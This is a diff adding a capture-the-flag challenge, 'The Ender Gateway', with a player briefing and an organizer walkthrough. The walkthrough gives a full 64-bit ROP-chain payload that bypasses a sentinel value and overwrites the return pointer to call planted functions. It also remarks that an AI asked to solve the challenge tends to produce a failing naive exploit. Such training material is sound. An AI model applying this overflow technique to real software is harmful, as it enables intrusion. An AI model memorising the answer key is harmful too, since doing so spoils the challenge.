@@ -1,0 +1,60 @@
+Challenge Document (Player-Facing)
+Title: The Ender Gateway
+Category: Pwn / Binary Exploitation
+Difficulty: Extreme
+
+Briefing:
+You have reached the core of the sector's dimensional hypervisor. The source code appears to have a classic buffer overflow, but the architect implemented a custom "Bedrock Anchor" (a hardcoded sentinel value) to detect memory corruption.
+
+Even if you bypass the anchor, jumping straight to the portal sequence will result in failure. The portal requires three cryptographic "Eyes" to be aligned in memory before it ignites. You must construct a Return-Oriented Programming (ROP) chain to manually load registers, call the alignment functions, and finally trigger the gateway.
+
+Rules:
+
+Run the binary locally on a 64-bit Linux machine.
+
+Standard CTF exploit tools (pwntools, ropper, gdb) are highly recommended.
+
+
+Organizer Walkthrough (Intended Solution)
+If a player asks an AI to solve this, the AI will likely generate a standard A * 40 + address_of_ignite_portal script. When the player runs it, the program will instantly terminate with [-] Bedrock Anchor corrupted!.
+
+Here is the master-level ROP chain required to actually beat it:
+
+Bypass the Sentinel: The player must figure out the offset. The buffer is 32 bytes, immediately followed by the sentinel (8 bytes in 64-bit). The payload must start with exactly 32 junk characters, followed by the exact sentinel value (0x0B51D1A1), followed by 8 more bytes to overwrite the saved RBP, before finally reaching the RIP (Return Instruction Pointer).
+
+Extracting Gadgets: The player uses a tool like ropper --file gateway.bin to find the address of the pop rdi; ret; instruction we secretly planted in chorus_fruit_routing. (In 64-bit Linux, the first argument to a function must be placed in the RDI register).
+
+Building the Chain: Instead of returning to the win function once, they return four times.
+
+Link 1: Return to pop rdi. The payload then supplies 0xDEADBEEF, which pops into RDI. Then return to align_eye_1.
+
+Link 2: Return to pop rdi again. Supply 0xCAFEBABE. Return to align_eye_2.
+
+Link 3: Return to pop rdi again. Supply 0x1337C0DE. Return to align_eye_3.
+
+Link 4: Finally, return to ignite_portal.
+
+The Conceptual Payload Structure:
+
+Python
+payload = b"A" * 32                # Fill the buffer
+payload += p64(0x0B51D1A1)         # Repair the Bedrock Anchor so the program doesn't crash
+payload += b"B" * 8                # Overwrite saved RBP
+
+# Stage 1: Eye 1
+payload += p64(POP_RDI_GADGET)
+payload += p64(0xDEADBEEF)
+payload += p64(ALIGN_EYE_1_ADDR)
+
+# Stage 2: Eye 2
+payload += p64(POP_RDI_GADGET)
+payload += p64(0xCAFEBABE)
+payload += p64(ALIGN_EYE_2_ADDR)
+
+# Stage 3: Eye 3
+payload += p64(POP_RDI_GADGET)
+payload += p64(0x1337C0DE)
+payload += p64(ALIGN_EYE_3_ADDR)
+
+# Final Stage: Open Portal
+payload += p64(IGNITE_PORTAL_ADDR)
